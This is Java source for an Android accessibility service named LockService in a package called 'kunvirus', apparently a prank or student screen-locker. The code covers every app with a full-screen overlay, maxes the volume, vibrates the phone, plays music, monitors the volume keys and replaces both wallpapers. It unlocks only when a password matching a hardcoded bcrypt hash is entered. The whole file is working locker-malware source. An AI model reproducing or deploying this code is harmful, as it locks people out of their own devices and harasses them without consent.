package cn.edu.zjut.kunvirus.service;

import static android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
import static android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.AttributeSet;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;

import cn.edu.zjut.kunvirus.R;
import cn.edu.zjut.kunvirus.utils.AmazingUtil;
import cn.edu.zjut.kunvirus.utils.SecureUtil;

public class LockService extends AccessibilityService {
    private final String pwdEncrypted="$2a$12$nHcCYECmuxxn5eMxSD9M7uqcT/opA4DpCFewnb7P0mFoLp8ZR61vO";
    private View maskViewCore;

    private void beginBindService(){
        if (maskViewCore == null){
            Context applicationContext = this.getApplicationContext();
            Object winService = this.getSystemService(WINDOW_SERVICE);
            if(winService!=null){
                maskViewCore = this.createMaskView(applicationContext,(WindowManager)winService);
                AmazingUtil.openMusicService(this);
                AmazingUtil.shakeItBaby(this);//手机振动
                AmazingUtil.openVolumeListener(this);//音量监听
                AmazingUtil.setMaxVolume(this);//音量调节到最大
                AmazingUtil.SetWallPaper(this);
                AmazingUtil.SetLockWallPaper(this);
            }
        }
    }

    private View createMaskView(Context context, WindowManager windowManager) {
        FrameLayout layout = new FrameLayout(context, (AttributeSet)null);
        layout.setLayoutParams(new ViewGroup.LayoutParams(200,200));
        layout.setBackgroundColor(Color.parseColor("#FFFFFF"));
        /*layout.setBackgroundResource(R.drawable.cxk_lock_bg);*/
        //LayoutInflater.inflate()用于动态加载界面
        View main_view = LayoutInflater.from(context).inflate(R.layout.activity_main, (ViewGroup)null);
        main_view.setLayoutParams(
                new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        );
        layout.addView(main_view);
        doThis(main_view);
        //TYPE_ACCESSIBILITY_OVERLAY使用它可以在所有的应用程序上展示蒙层。
        //FLAG_LAYOUT_IN_SCREEN 将窗口放置在整个屏幕中，忽略来自父窗口的任何约束。
        windowManager.addView(layout,new WindowManager.LayoutParams(
                TYPE_ACCESSIBILITY_OVERLAY, FLAG_LAYOUT_IN_SCREEN, PixelFormat.TRANSLUCENT));
        return main_view;
    }

    private void doThis(View view){
        /*EditText passwordText = view.findViewById(R.id.cxkPassword);
        passwordText.setOnEditorActionListener((v, actionId, event) -> {//监听软键盘右下角确定键
            if (actionId == EditorInfo.IME_ACTION_DONE) {
                passwordCheck(view);
            }
            return false;
        });*/
        view.findViewById(R.id.exitButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                passwordCheck(view);
            }
        });

    }

    private void passwordCheck(View view){
        EditText passwordText = view.findViewById(R.id.cxkPassword);
        TextView tipsTextView = view.findViewById(R.id.tipsTextView);
        String passwordStr =passwordText.getText().toString();
        Handler handler = new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(@NonNull Message msg) {
                super.handleMessage(msg);
                switch (msg.what){
                    case 0: tipsTextView.setText("密码不能为空！");break;
                    case 1: tipsTextView.setText("密码错误！");break;
                    case 2:
                        setEndSignal();
                        stopMusic();
                        System.exit(0);
                }
            }
        };
        new Thread(new Runnable() {
            @Override
            public void run() {
                Message message = new Message();
                if(passwordStr.trim().equals("")){
                    message.what=0;
                }else if(!SecureUtil.match(passwordStr,pwdEncrypted)){
                    message.what=1;
                }else{
                    message.what=2;
                }
                handler.sendMessage(message);
            }
        }).start();
    }

    public void stopMusic(){


        stopService(new Intent(this, MusicService.class));//退出音乐服务
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        maskViewCore = null;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        if(getStartSignal().equals("cxk000")){
            beginBindService();
        }

    }

    private String getStartSignal(){
        try {
            FileInputStream fis = openFileInput("cxk.txt");
            InputStreamReader isr = new InputStreamReader(fis, "UTF-8");
            //获取文件的可用长度，构建一个字符数组
            char[] input = new char[fis.available()];
            isr.read(input);
            isr.close();
            fis.close();
            return new String(input);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void setEndSignal(){
        String content = "cxk111";
        try {
            FileOutputStream os = openFileOutput("cxk.txt", MODE_PRIVATE);
            //写数据
            os.write(content.getBytes());
            os.close();//关闭文件
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
